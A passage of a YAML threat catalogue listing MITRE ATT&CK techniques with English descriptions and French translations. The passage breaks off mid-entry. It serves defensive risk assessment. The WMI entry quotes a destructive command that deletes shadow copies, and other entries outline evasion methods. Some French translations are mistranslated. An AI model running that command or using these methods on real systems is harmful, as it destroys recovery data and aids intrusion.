  threats:
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.011
    ref_id: T1055.011
    name: Extra Window Memory Injection
    description: "Adversaries may inject malicious code into process via Extra Window\
      \ Memory (EWM) in order to evade process-based defenses as well as possibly\
      \ elevate privileges. EWM injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nBefore creating a window,\
      \ graphical Windows-based processes must prescribe to or register a windows\
      \ class, which stipulate appearance and behavior (via windows procedures, which\
      \ are functions that handle input/output of data).(Citation: Microsoft Window\
      \ Classes) Registration of new windows classes can include a request for up\
      \ to 40 bytes of EWM to be appended to the allocated memory of each instance\
      \ of that class. This EWM is intended to store data specific to that window\
      \ and has specific application programming interface (API) functions to set\
      \ and get its value. (Citation: Microsoft GetWindowLong function) (Citation:\
      \ Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough\
      \ to store a 32-bit pointer and is often used to point to a windows procedure.\
      \ Malware may possibly utilize this memory location in part of an attack chain\
      \ that includes writing code to shared sections of the process\u2019s memory,\
      \ placing a pointer to the code in EWM, then invoking execution by returning\
      \ execution control to the address in the process\u2019s EWM.\n\nExecution granted\
      \ through EWM injection may allow access to both the target process's memory\
      \ and possibly elevated privileges. Writing payloads to shared sections also\
      \ avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code>\
      \ and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July\
      \ 2017) More sophisticated malware samples may also potentially bypass protection\
      \ mechanisms such as data execution prevention (DEP) by triggering a combination\
      \ of windows procedures and other system functions that will rewrite the malicious\
      \ payload inside an executable portion of the target process.  (Citation: MalwareTech\
      \ Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\
      \nRunning code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via EWM injection may also evade detection from security products since the\
      \ execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/011"
    translations:
      fr:
        name: "Injection de m\xE9moire par fen\xEAtre suppl\xE9mentaire"
        description: "Les adversaires peuvent injecter du code malveillant dans le\
          \ processus via la m\xE9moire de fen\xEAtre suppl\xE9mentaire (EWM) afin\
          \ d'\xE9chapper aux d\xE9fenses bas\xE9es sur le processus et \xE9ventuellement\
          \ d'augmenter leurs privil\xE8ges. L'injection EWM est une m\xE9thode d'ex\xE9\
          cution de code arbitraire dans l'espace d'adressage d'un processus en direct\
          \ distinct. \n\nAvant de cr\xE9er une fen\xEAtre, les processus graphiques\
          \ bas\xE9s sur Windows doivent prescrire ou enregistrer une classe Windows,\
          \ qui stipule l'apparence et le comportement (via les proc\xE9dures Windows,\
          \ qui sont des fonctions qui g\xE8rent l'entr\xE9e/sortie des donn\xE9es).(\
          \ Citation : Microsoft Window Classes) L'enregistrement de nouvelles classes\
          \ Windows peut inclure une demande d'ajout \xE0 la m\xE9moire allou\xE9\
          e de chaque instance de cette classe jusqu'\xE0 40 octets d'EWM. Ce EWM\
          \ est destin\xE9 \xE0 stocker des donn\xE9es sp\xE9cifiques \xE0 cette fen\xEA\
          tre et poss\xE8de des fonctions sp\xE9cifiques d'interface de programmation\
          \ d'applications (API) pour d\xE9finir et en tirer la valeur. (Citation\
          \ : fonction Microsoft GetWindowLong) (Citation : fonction Microsoft SetWindowLong)\n\
          \nBien que petit, l'EWM est suffisamment grand pour stocker un pointeur\
          \ 32 bits et est souvent utilis\xE9 pour pointer vers une proc\xE9dure Windows.\
          \ Les logiciels malveillants peuvent utiliser cet emplacement m\xE9moire\
          \ dans une partie d'une cha\xEEne d'attaques qui inclut l'\xE9criture de\
          \ code dans des sections partag\xE9es de la m\xE9moire du processus, l'ajout\
          \ d'un pointeur au code dans EWM, puis l'ex\xE9cution en restituant le contr\xF4\
          le d'ex\xE9cution \xE0 l'adresse dans l'EWM du processus.\n\nL'ex\xE9cution\
          \ accord\xE9e par injection EWM peut permettre d'acc\xE9der \xE0 la fois\
          \ \xE0 la m\xE9moire du processus cible et \xE9ventuellement \xE0 des privil\xE8\
          ges \xE9lev\xE9s. L'\xE9criture de charges utiles dans des sections partag\xE9\
          es \xE9vite \xE9galement l'utilisation d'appels API tr\xE8s surveill\xE9\
          s tels que <code>WriteProcessMemory</code> et <code>CreateRemoteThread</code>.\
          \ (Citation : Injection de proc\xE9d\xE9 \xE9lastique juillet 2017) Des\
          \ exemples de logiciels malveillants plus sophistiqu\xE9s peuvent \xE9galement\
          \ potentiellement contourner des m\xE9canismes de protection tels que la\
          \ pr\xE9vention de l'ex\xE9cution de donn\xE9es (DEP) en d\xE9clenchant\
          \ une combinaison de proc\xE9dures Windows et d'autres fonctions syst\xE8\
          me qui r\xE9\xE9crivent la charge utile malveillante \xE0 l'int\xE9rieur\
          \ d'une partie ex\xE9cutable du processus cible.  (Citation : MalwareTech\
          \ Power Loader ao\xFBt 2013) (Citation : WeLiveSecurity Gapz et Redyms mars\
          \ 2013)\n\nL'ex\xE9cution du code dans le contexte d'un autre processus\
          \ peut permettre d'acc\xE9der \xE0 la m\xE9moire du processus, aux ressources\
          \ syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0 des privil\xE8ges \xE9\
          lev\xE9s. L'ex\xE9cution via injection EWM peut \xE9galement \xE9chapper\
          \ \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque l'ex\xE9cution\
          \ est masqu\xE9e par un processus l\xE9gitime.https\_://attack.mitre.org/techniques/T1055/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.005
    ref_id: T1053.005
    name: Scheduled Task
    description: 'Adversaries may abuse the Windows Task Scheduler to perform task
      scheduling for initial or recurring execution of malicious code. There are multiple
      ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments)

      https://attack.mitre.org/techniques/T1053/005'
    translations:
      fr:
        name: "T\xE2che programm\xE9e"
        description: "Les adversaires peuvent abuser du planificateur des t\xE2ches\
          \ Windows pour effectuer la planification des t\xE2ches en vue d'une ex\xE9\
          cution initiale ou r\xE9currente de code malveillant. Il existe plusieurs\
          \ fa\xE7ons d'acc\xE9der au planificateur des t\xE2ches sous Windows. L'utilitaire\
          \ [schtasks](https://attack.mitre.org/software/S0111) peut \xEAtre ex\xE9\
          cut\xE9 directement en ligne de commande, ou l'ordonnanceur des t\xE2ches\
          \ peut \xEAtre ouvert via l'interface graphique dans la section Outils d'administrateur\
          \ du Panneau de configuration. (Citation : D\xE9bordement de pile) Dans\
          \ certains cas, des adversaires ont utilis\xE9 un envelopper .NET pour le\
          \ planificateur des t\xE2ches Windows, et alternativement, les adversaires\
          \ ont utilis\xE9 la biblioth\xE8que Windows netapi32 et [Windows Management\
          \ Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) pour\
          \ cr\xE9er une t\xE2che planifi\xE9e. Les adversaires peuvent \xE9galement\
          \ utiliser le commandlet Powershell 'Invoke-CimMethod', qui exploite la\
          \ classe WMI 'PS_ScheduledTask' pour cr\xE9er une t\xE2che planifi\xE9e\
          \ via un chemin XML. (Citation : Red Canary - \xC9quipe Atomic Red)\n\n\
          Un adversaire peut utiliser le planificateur de t\xE2ches de Windows pour\
          \ ex\xE9cuter des programmes au d\xE9marrage du syst\xE8me ou sur une base\
          \ planifi\xE9e pour la persistance. Le planificateur de t\xE2ches Windows\
          \ peut \xE9galement \xEAtre abus\xE9 pour effectuer une ex\xE9cution \xE0\
          \ distance dans le cadre d'un mouvement lat\xE9ral et/ou pour ex\xE9cuter\
          \ un processus dans le cadre d'un compte sp\xE9cifi\xE9 (comme SYSTEM).\
          \ \xC0 l'instar de [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),\
          \ les adversaires ont \xE9galement abus\xE9 du planificateur des t\xE2ches\
          \ Windows pour potentiellement masquer une ex\xE9cution unique sous des\
          \ processus syst\xE8me sign\xE9s/fiables. (Citation : ProofPoint Serpent)\n\
          \nLes adversaires peuvent \xE9galement cr\xE9er des t\xE2ches planifi\xE9\
          es \xAB cach\xE9es \xBB (c'est-\xE0-dire [Masquer les artefacts](https://attack.mitre.org/techniques/T1564))\
          \ qui peuvent ne pas \xEAtre visibles par les outils de d\xE9fense et les\
          \ requ\xEAtes manuelles utilis\xE9es pour \xE9num\xE9rer les t\xE2ches.\
          \ Plus pr\xE9cis\xE9ment, un adversaire peut masquer une t\xE2che \xE0 \xAB\
          \ schtasks /query \xBB et au planificateur de t\xE2ches en supprimant la\
          \ valeur associ\xE9e du registre du descripteur de s\xE9curit\xE9 (SD) (o\xF9\
          \ la suppression de cette valeur doit \xEAtre effectu\xE9e en utilisant\
          \ les permissions SYSTEM). (Citation : SigmaHQ)(Citation : T\xE2che pr\xE9\
          vue par Tarrask) Les adversaires peuvent \xE9galement employer d'autres\
          \ m\xE9thodes pour masquer les t\xE2ches, comme modifier les m\xE9tadonn\xE9\
          es (par exemple, la valeur \xAB Index \xBB) dans les cl\xE9s du registre\
          \ associ\xE9es. (Citation : D\xE9fense contre les attaques de t\xE2ches\
          \ planifi\xE9es dans les environnements Windows)https://attack.mitre.org/techniques/T1053/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.002
    ref_id: T1205.002
    name: Socket Filters
    description: 'Adversaries may attach filters to a network socket to monitor then
      activate backdoors used for persistence or command and control. With elevated
      permissions, adversaries can use features such as the `libpcap` library to open
      sockets and install filters to allow or disallow certain types of data to come
      through the socket. The filter may apply to all traffic passing through the
      specified network interface (or every interface if not specified). When the
      network interface receives a packet matching the filter criteria, additional
      actions can be triggered on the host, such as activation of a reverse shell.


      To establish a connection, an adversary sends a crafted packet to the targeted
      host that matches the installed filter criteria.(Citation: haking9 libpcap network
      sniffing) Adversaries have used these socket filters to trigger the installation
      of implants, conduct ping backs, and to invoke command shells. Communication
      with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation:
      exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May
      2020)


      Filters can be installed on any Unix-like platform with `libpcap` installed
      or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with
      `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER`
      options. Since the socket connection is not active until the packet is received,
      this behavior may be difficult to detect due to the lack of activity on a host,
      low CPU overhead, and limited visibility into raw socket usage.

      https://attack.mitre.org/techniques/T1205/002'
    translations:
      fr:
        name: "Filtres \xE0 douille"
        description: "Les adversaires peuvent attacher des filtres \xE0 un socket\
          \ r\xE9seau pour surveiller puis activer des portes d\xE9rob\xE9es utilis\xE9\
          es pour la persistance ou le commandement et contr\xF4le. Avec des permissions\
          \ \xE9lev\xE9es, les adversaires peuvent utiliser des fonctionnalit\xE9\
          s telles que la biblioth\xE8que \xAB libpcap \xBB pour ouvrir des sockets\
          \ et installer des filtres permettant ou non \xE0 certains types de donn\xE9\
          es de passer par le socket. Le filtre peut s'appliquer \xE0 tout trafic\
          \ passant par l'interface r\xE9seau sp\xE9cifi\xE9e (ou \xE0 toute interface\
          \ si elle n'est pas sp\xE9cifi\xE9e). Lorsque l'interface r\xE9seau re\xE7\
          oit un paquet correspondant aux crit\xE8res du filtre, des actions suppl\xE9\
          mentaires peuvent \xEAtre d\xE9clench\xE9es sur l'h\xF4te, comme l'activation\
          \ d'un reverse shell.\n\nPour \xE9tablir une connexion, un adversaire envoie\
          \ un paquet con\xE7u \xE0 l'h\xF4te cibl\xE9 qui correspond aux crit\xE8\
          res du filtre install\xE9. (Citation : haking9 libpcap r\xE9seau snif) Les\
          \ adversaires ont utilis\xE9 ces filtres de socket pour d\xE9clencher l'installation\
          \ d'implants, effectuer des retro-ping et invoquer des coques de commande.\
          \ La communication avec ces filtres de socket peut \xE9galement \xEAtre\
          \ utilis\xE9e en conjonction avec le [Protocole Tunneling](https://attack.mitre.org/techniques/T1572).\
          \ (Citation : exatrack bpf filtre les portes d\xE9rob\xE9es passives)(Citation\
          \ : Leonardo Turla Penquin mai 2020)\n\nLes filtres peuvent \xEAtre install\xE9\
          s sur n'importe quelle plateforme de type Unix avec 'libpcap' install\xE9\
          \ ou sur des h\xF4tes Windows utilisant 'Winpcap'.  Les adversaires peuvent\
          \ utiliser soit \xAB libpcap \xBB avec \xAB pcap_setfilter \xBB, soit la\
          \ fonction de biblioth\xE8que standard \xAB setsockopt \xBB avec les options\
          \ \xAB SO_ATTACH_FILTER \xBB. Puisque la connexion socket n'est pas active\
          \ tant que le paquet n'est pas re\xE7u, ce comportement peut \xEAtre difficile\
          \ \xE0 d\xE9tecter en raison du manque d'activit\xE9 sur un h\xF4te, de\
          \ la faible surcharge du processeur et de la visibilit\xE9 limit\xE9e sur\
          \ l'utilisation brute du socket.https\_://attack.mitre.org/techniques/T1205/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1560.001
    ref_id: T1560.001
    name: Archive via Utility
    description: "Adversaries may use utilities to compress and/or encrypt collected\
      \ data prior to exfiltration. Many utilities include functionalities to compress,\
      \ encrypt, or otherwise package data into a format that is easier/more secure\
      \ to transport.\n\nAdversaries may abuse various utilities to compress or encrypt\
      \ data before exfiltration. Some third party utilities may be preinstalled,\
      \ such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows\
      \ systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may\
      \ be used to package collected files into a cabinet (.cab) file. <code>diantz</code>\
      \ may also be used to download and compress files from remote locations (i.e.\
      \ [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation:\
      \ diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories\
      \ with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160)\
      \ to Base64 encode collected data before exfiltration. \n\nAdversaries may use\
      \ also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform\
      \ similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation:\
      \ WinZip Homepage)\nhttps://attack.mitre.org/techniques/T1560/001"
    translations:
      fr:
        name: Archive via l'utilitaire
        description: "Les adversaires peuvent utiliser des utilitaires pour compresser\
          \ et/ou chiffrer les donn\xE9es collect\xE9es avant l'exfiltration. De nombreux\
          \ utilitaires incluent des fonctionnalit\xE9s pour compresser, chiffrer\
          \ ou autrement emballer les donn\xE9es dans un format plus facile et plus\
          \ s\xE9curis\xE9 \xE0 transporter.\n\nLes adversaires peuvent abuser de\
          \ divers utilitaires pour compresser ou chiffrer les donn\xE9es avant l'exfiltration.\
          \ Certains utilitaires tiers peuvent \xEAtre pr\xE9install\xE9s, comme <code>tar</code>\
          \ sur Linux et macOS ou <code>zip</code> sur les syst\xE8mes Windows. \n\
          \nSous Windows, <code>diantz</code> ou <code> makecab</code> peut \xEAtre\
          \ utilis\xE9 pour emballer les fichiers collect\xE9s dans un fichier cabinet\
          \ (.cab). <code>diantz</code> peut \xE9galement \xEAtre utilis\xE9 pour\
          \ t\xE9l\xE9charger et compresser des fichiers depuis des emplacements distants\
          \ (par exemple [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(\
          \ Citation : diantz.exe_lolbas) <code>xcopy</code> sous Windows peut copier\
          \ des fichiers et des r\xE9pertoires avec diverses options. De plus, les\
          \ adversaires peuvent utiliser [certutil](https://attack.mitre.org/software/S0160)\
          \ pour encoder les donn\xE9es collect\xE9es par Base64 avant l'exfiltration.\
          \ \n\nLes adversaires peuvent \xE9galement utiliser des utilitaires tiers,\
          \ tels que 7-Zip, WinRAR et WinZip, pour effectuer des activit\xE9s similaires.\
          \ Citation : 7zip page d'accueil) (Citation : page d'accueil WinRAR) (Citation\
          \ : page d'accueil WinZip)https://attack.mitre.org/techniques/T1560/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.005
    ref_id: T1021.005
    name: VNC
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to remotely control machines using Virtual Network Computing (VNC).  VNC is\
      \ a platform-independent desktop sharing system that uses the RFB (\u201Cremote\
      \ framebuffer\u201D) protocol to enable users to remotely control another computer\u2019\
      s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation:\
      \ The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ as VNC is screen-sharing software rather than resource-sharing software. By\
      \ default, VNC uses the system's authentication, but it can be configured to\
      \ use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation:\
      \ VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions\
      \ as the logged-on user such as opening documents, downloading files, and running\
      \ arbitrary commands. An adversary could use VNC to remotely control and monitor\
      \ a system to collect data and information to pivot to other systems within\
      \ the network. Specific VNC libraries/implementations have also been susceptible\
      \ to brute force attacks and memory usage exploitation.(Citation: Hijacking\
      \ VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC\
      \ Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation:\
      \ Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)\nhttps://attack.mitre.org/techniques/T1021/005"
    translations:
      fr:
        name: VNC
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour contr\xF4ler \xE0 distance des machines en utilisant le Virtual Network\
          \ Computing (VNC).  VNC est un syst\xE8me de partage de bureau ind\xE9pendant\
          \ de la plateforme qui utilise le protocole RFB (\xAB\_remote framebuffer\_\
          \xBB) pour permettre aux utilisateurs de contr\xF4ler \xE0 distance l'affichage\
          \ d'un autre ordinateur en relayant les entr\xE9es de l'\xE9cran, de la\
          \ souris et du clavier via le r\xE9seau. (Citation : Le protocole de framebuffer\
          \ \xE0 distance)\n\nVNC diff\xE8re du [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
          \ car VNC est un logiciel de partage d'\xE9cran plut\xF4t qu'un logiciel\
          \ de partage de ressources. Par d\xE9faut, VNC utilise l'authentification\
          \ du syst\xE8me, mais il peut \xEAtre configur\xE9 pour utiliser des identifiants\
          \ sp\xE9cifiques \xE0 VNC. (Citation : Logiciel VNC MacOS pour bureau \xE0\
          \ distance)(Citation : Authentification VNC)\n\nLes adversaires peuvent\
          \ abuser du VNC pour effectuer des actions malveillantes en tant qu'utilisateur\
          \ connect\xE9, telles que l'ouverture de documents, le t\xE9l\xE9chargement\
          \ de fichiers ou l'ex\xE9cution de commandes arbitraires. Un adversaire\
          \ pourrait utiliser le VNC pour contr\xF4ler et surveiller \xE0 distance\
          \ un syst\xE8me afin de collecter des donn\xE9es et des informations afin\
          \ de les transf\xE9rer vers d'autres syst\xE8mes du r\xE9seau. Certaines\
          \ biblioth\xE8ques/impl\xE9mentations VNC ont \xE9galement \xE9t\xE9 vuln\xE9\
          rables aux attaques par force brute et \xE0 l'exploitation de la m\xE9moire.\
          \ (Citation : D\xE9tournement de VNC)(Citation : connexion VNC root macOS\
          \ sans authentification)(Citation : Vuln\xE9rabilit\xE9s VNC)(Citation :\
          \ V\xE9rification d'authentification VNC de s\xE9curit\xE9 offensive)(Citation\
          \ : Attaque des serveurs VNC PentestLab)(Citation : Bug d'authentification\
          \ \xE0 La Havane) https://attack.mitre.org/techniques/T1021/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1047
    ref_id: T1047
    name: Windows Management Instrumentation
    description: "Adversaries may abuse Windows Management Instrumentation (WMI) to\
      \ execute malicious commands and payloads. WMI is designed for programmers and\
      \ is the infrastructure for management data and operations on Windows systems.(Citation:\
      \ WMI 1-3) WMI is an administration feature that provides a uniform environment\
      \ to access Windows system components.\n\nThe WMI service enables both local\
      \ and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
      \ and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation:\
      \ WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM\
      \ operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI\
      \ 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with\
      \ local and remote systems and use it as a means to execute various behaviors,\
      \ such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007)\
      \ as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands\
      \ and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused\
      \ by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy\
      \ Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation:\
      \ WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the\
      \ WMIC feature being \u201Cdisabled by default\u201D on Windows 11+. WMIC will\
      \ be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell\
      \ and tools like `wbemtool.exe`, COM APIs can also be used to programmatically\
      \ interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)\nhttps://attack.mitre.org/techniques/T1047"
    translations:
      fr:
        name: Instrumentation de gestion Windows
        description: "Les adversaires peuvent abuser de Windows Management Instrumentation\
          \ (WMI) pour ex\xE9cuter des commandes et des charges utiles malveillantes.\
          \ WMI est con\xE7ue pour les programmeurs et sert d'infrastructure pour\
          \ la gestion des donn\xE9es et des op\xE9rations sur les syst\xE8mes Windows.\
          \ (Citation : WMI 1-3) WMI est une fonctionnalit\xE9 d'administration qui\
          \ offre un environnement uniforme pour acc\xE9der aux composants syst\xE8\
          me Windows.\n\nLe service WMI permet \xE0 la fois un acc\xE8s local et distant,\
          \ bien que ce dernier soit facilit\xE9 par des [Services \xE0 distance](https://attack.mitre.org/techniques/T1021)\
          \ tels que [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ et [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).\
          \ (Citation : WMI 1-3) WMI distant sur DCOM fonctionne via le port 135,\
          \ tandis que WMI sur WinRM fonctionne sur le port 5985 lorsqu'on utilise\
          \ HTTP et 5986 pour HTTPS. (Citation : WMI 1-3) (Citation : Mandiant WMI)\n\
          \nUn adversaire peut utiliser WMI pour interagir avec des syst\xE8mes locaux\
          \ et distants et l'utiliser comme moyen d'ex\xE9cuter divers comportements,\
          \ tels que la collecte d'informations pour [D\xE9couverte](https://attack.mitre.org/tactics/TA0007)\
          \ ainsi que pour [Ex\xE9cution](https://attack.mitre.org/tactics/TA0002)\
          \ de commandes et de charges utiles. (Citation : Mandiant WMI) Par exemple,\
          \ \xAB wmic.exe \xBB peut \xEAtre abus\xE9 par un adversaire pour supprimer\
          \ des copies d'ombre avec la commande \xAB wmic.exe Shadowcopy Delete \xBB\
          \ (c'est-\xE0-dire [Inhibt System Recovery](https://attack.mitre.org/techniques/T1490)).\
          \ (Citation : WMI 6)\n\n**Note :** 'wmic.exe' est d\xE9pr\xE9ci\xE9 depuis\
          \ janvier 2024, la fonctionnalit\xE9 WMIC \xE9tant \xAB d\xE9sactiv\xE9\
          e par d\xE9faut \xBB sur Windows 11+. Le WMIC sera retir\xE9 des versions\
          \ Windows ult\xE9rieures et remplac\xE9 par [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ comme interface WMI principale. (Citation : WMI 7,8) En plus de PowerShell\
          \ et d'outils comme \xAB wbemtool.exe \xBB, les API COM peuvent \xE9galement\
          \ \xEAtre utilis\xE9es pour interagir programmatiquement avec WMI via C++,\
          \ .NET, VBScript, etc. (Citation : WMI 7,8)https://attack.mitre.org/techniques/T1047"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1113
    ref_id: T1113
    name: Screen Capture
    description: 'Adversaries may attempt to take screen captures of the desktop to
      gather information over the course of an operation. Screen capturing functionality
      may be included as a feature of a remote access tool used in post-compromise
      operations. Taking a screenshot is also typically possible through native utilities
      or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation:
      CopyFromScreen .NET)(Citation: Antiquated Mac Malware)

      https://attack.mitre.org/techniques/T1113'
    translations:
      fr:
        name: "Capture d'\xE9cran"
        description: "Les adversaires peuvent tenter de prendre des captures d'\xE9\
          cran du bureau pour recueillir des informations au cours d'une op\xE9ration.\
          \ La fonctionnalit\xE9 de capture d'\xE9cran peut \xEAtre incluse dans un\
          \ outil d'acc\xE8s \xE0 distance utilis\xE9 lors des op\xE9rations post-compromis.\
          \ Prendre une capture d'\xE9cran est \xE9galement g\xE9n\xE9ralement possible\
          \ via des utilitaires natifs ou des appels API, tels que <code>CopyFromScreen</code>,\
          \ <code>xwd</code>, ou <code>capture</code>. (Citation : CopyFromScreen\
          \ .NET)(Citation : Malware Mac d\xE9su\xE8te) https://attack.mitre.org/techniques/T1113"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.011
    ref_id: T1027.011
    name: Fileless Storage
    description: "Adversaries may store data in \"fileless\" formats to conceal malicious\
      \ activity from defenses. Fileless storage can be broadly defined as any format\
      \ other than a file. Common examples of non-volatile fileless storage in Windows\
      \ systems include the Windows Registry, event logs, or WMI repository.(Citation:\
      \ Microsoft Fileless)(Citation: SecureList Fileless) Shared memory directories\
      \ on Linux systems (`/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`) and\
      \ volatile directories on Network Devices (`/tmp` and `/volatile`) may also\
      \ be considered fileless storage, as files written to these directories are\
      \ mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary\
      \ Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation:\
      \ Aquasec Muhstik Malware 2024)(Citation: Bitsight 7777 Botnet)(Citation: CISCO\
      \ Nexus 900 Config).\n\nSimilar to fileless in-memory behaviors such as [Reflective\
      \ Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055),\
      \ fileless data storage may remain undetected by anti-virus and other endpoint\
      \ security tools that can only access specific file formats from disk storage.\
      \ Leveraging fileless storage may also allow adversaries to bypass the protections\
      \ offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware\
      \ 23022)\n\nAdversaries may use fileless storage to conceal various types of\
      \ stored data, including payloads/shellcode (potentially being used as part\
      \ of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data\
      \ not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).\
      \ Adversaries also often encrypt, encode, splice, or otherwise obfuscate this\
      \ fileless data when stored. \n\nSome forms of fileless storage activity may\
      \ indirectly create artifacts in the file system, but in central and otherwise\
      \ difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\\
      Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical\
      \ files.(Citation: Microsoft Fileless)\nhttps://attack.mitre.org/techniques/T1027/011"
    translations:
      fr:
        name: Stockage sans fichiers
        description: "Les adversaires peuvent stocker les donn\xE9es sous forme \xAB\
          \ sans fichier \xBB afin de dissimuler toute activit\xE9 malveillante aux\
          \ d\xE9fenses. Le stockage sans fichiers peut \xEAtre d\xE9fini de mani\xE8\
          re large comme n'importe quel format autre qu'un fichier. Des exemples courants\
          \ de stockage sans fichiers non volatils dans les syst\xE8mes Windows incluent\
          \ le Registre Windows, les journaux d'\xE9v\xE9nements ou le d\xE9p\xF4\
          t WMI. (Citation : Microsoft Fileless)(Citation : SecureList Sans fichiers)\
          \ Les r\xE9pertoires de m\xE9moire partag\xE9e sur les syst\xE8mes Linux\
          \ ('/dev/shm', '/run/shm', '/var/run' et '/var/lock') et les r\xE9pertoires\
          \ volatils sur les dispositifs r\xE9seau ('/tmp' et '/volatile') peuvent\
          \ \xE9galement \xEAtre consid\xE9r\xE9s comme du stockage sans fichiers,\
          \ car les fichiers \xE9crits dans ces r\xE9pertoires sont mapp\xE9s directement\
          \ \xE0 la RAM et non stock\xE9s sur le disque. (Citation : Binaire \xE9\
          lastique ex\xE9cut\xE9 depuis un r\xE9pertoire m\xE9moire partag\xE9e)(Citation\
          \ : Akami Frog4Shell 2024)(Citation : Aquasec Muhstik Malware 2024)(Citation\
          \ : Bitsight 7777 Botnet)(Citation : CISCO Nexus 900 Config).\n\n\xC0 l'instar\
          \ des comportements en m\xE9moire sans fichiers tels que [Chargement de\
